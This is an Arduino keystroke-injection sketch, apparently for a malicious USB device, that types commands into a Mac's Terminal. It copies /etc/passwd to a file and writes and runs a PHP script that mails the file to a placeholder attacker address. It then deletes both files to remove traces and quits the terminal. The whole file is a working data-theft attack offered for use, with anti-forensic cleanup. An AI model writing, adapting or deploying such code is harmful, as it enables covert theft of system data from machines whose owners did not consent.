

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // open the terminal
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(300);

  // store the /etc/passwd/file in a txt-file
  Keyboard.print("cat /etc/passwd > stealpass.txt");

  typeKey(KEY_RETURN);

  // create the mail script in vim
  Keyboard.print("vim stealmail.php");

  delay(500);

  typeKey(KEY_RETURN);
  Keyboard.print("i");
  delay(1000);


  Keyboard.print("#!/usr/bin/php");
  typeKey(KEY_RETURN);
  Keyboard.print("<?php");
  typeKey(KEY_RETURN);
  Keyboard.print("$to = 'attackeremail@mail.com';"); // <- ATTACKER EMAIL
  typeKey(KEY_RETURN);
  Keyboard.print("$subject = 'passfile';");
  typeKey(KEY_RETURN);
  Keyboard.print("$body = file_get_contents('./stealpass.txt');");
  typeKey(KEY_RETURN);
  Keyboard.print("mail($to, $subject, $body);");
  typeKey(KEY_RETURN);
  Keyboard.print("?>");
  typeKey(KEY_RETURN);
  typeKey(KEY_RETURN);
  delay(500);
  typeKey(KEY_ESC);
  delay(500);
  Keyboard.print(":wq");
  typeKey(KEY_RETURN);

  // make the script executable
  delay(1000);
  Keyboard.print("chmod a+x stealmail.php");
  typeKey(KEY_RETURN);

  // run script
  Keyboard.print("./stealmail.php");
  typeKey(KEY_RETURN);

  delay(1000);

  // remove fingerprints
  Keyboard.print("rm stealmail.php");
  typeKey(KEY_RETURN);

  Keyboard.print("rm stealpass.txt");
  typeKey(KEY_RETURN);

  delay(1000);
  
  // shutdown
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('Q');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
